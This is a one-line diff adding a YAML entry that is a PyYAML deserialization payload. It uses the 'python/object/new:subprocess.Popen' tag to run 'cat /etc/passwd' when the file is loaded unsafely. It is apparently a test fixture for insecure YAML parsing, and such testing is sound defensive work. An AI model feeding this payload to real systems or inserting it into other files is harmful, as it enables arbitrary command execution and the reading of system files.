@@ -1,0 +1,1 @@
+a: !!python/object/new:subprocess.Popen [ ['cat /etc/passwd'], !!omap ]
